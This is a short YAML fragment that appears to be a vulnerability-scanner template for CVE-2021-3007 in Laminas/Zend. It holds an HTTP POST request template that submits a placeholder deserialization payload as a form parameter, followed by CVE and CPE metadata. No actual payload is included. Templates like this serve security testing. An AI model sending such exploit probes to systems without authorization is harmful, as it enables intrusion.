  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    {{param}}={{zend_payload}}

    '
id: CVE-2021-3007
info:
  author: 0xanis
  classification:
    cpe: cpe:2.3:a:getlaminas:laminas-http:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-3007
